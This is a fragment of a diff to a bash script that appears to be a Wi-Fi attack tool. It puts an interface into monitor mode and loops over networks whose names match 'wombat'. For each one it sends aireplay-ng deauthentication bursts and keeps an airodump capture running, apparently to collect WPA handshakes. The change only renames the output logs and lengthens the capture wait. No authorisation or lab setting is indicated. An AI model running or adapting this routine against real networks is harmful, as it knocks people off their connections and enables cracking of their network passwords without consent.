@@ -4,7 +4,7 @@
 INTERFACE="wlp0s20f3"
 MON_INTERFACE="${INTERFACE}mon"
 TARGET_STRING="wombat"
-OUTPUT_PREFIX="wombat_log"
+OUTPUT_PREFIX="new_log"
 
 # 1. Prepare Interface
 sudo airmon-ng check kill
@@ -50,7 +50,7 @@ while true; do
         sudo aireplay-ng -0 10 -a $BSSID --ignore-negative-one $MON_INTERFACE > /dev/null 2>&1
 
         # Wait for capture (15 seconds per target)
-        sleep 15
+        sleep 60
 
         # Kill airodump for this target and move to next
         kill $AIRO_PID
